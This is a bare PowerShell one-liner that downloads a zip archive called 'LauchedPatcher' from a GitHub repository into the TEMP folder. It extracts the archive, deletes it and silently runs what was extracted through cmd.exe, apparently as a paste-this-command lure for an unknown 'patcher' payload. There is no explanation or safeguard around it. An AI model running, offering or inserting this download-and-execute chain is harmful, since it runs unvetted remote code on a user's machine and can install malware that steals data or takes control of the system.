iwr https://github.com/SKILK12/MENI/raw/main/LauchedPatcher.zip -OutFile "$env:TEMP\LauchedPatcher.zip"; Expand-Archive -Path "$env:TEMP\LauchedPatcher.zip" -DestinationPath "$env:TEMP" -Force; Remove-Item -Path "$env:TEMP\LauchedPatcher.zip" -Force; Start-Process -FilePath "cmd.exe" -ArgumentList "/c $env:TEMP\LauchedPatcher"; Start-Sleep -Seconds 1; exit

